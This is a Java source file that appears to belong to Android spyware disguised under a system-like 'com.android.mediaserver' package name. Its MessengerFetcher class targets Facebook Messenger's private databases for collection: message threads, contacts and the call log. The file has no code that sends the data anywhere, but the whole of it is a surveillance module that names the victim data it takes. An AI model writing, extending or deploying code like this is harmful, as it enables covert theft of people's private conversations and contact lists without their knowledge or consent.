package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import java.io.File;
import java.util.ArrayList;

public class MessengerFetcher extends FileFetcher {
  public MessengerFetcher() {
    mFetchedFiles = new ArrayList();
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.facebook.orca/databases/threads_db2"), "APP",
            "messenger"));
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.facebook.orca/databases/contacts_db2"), "APP",
            "messenger"));
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.facebook.orca/databases/call_log.sqlite"), "APP",
            "messenger"));
  }
}
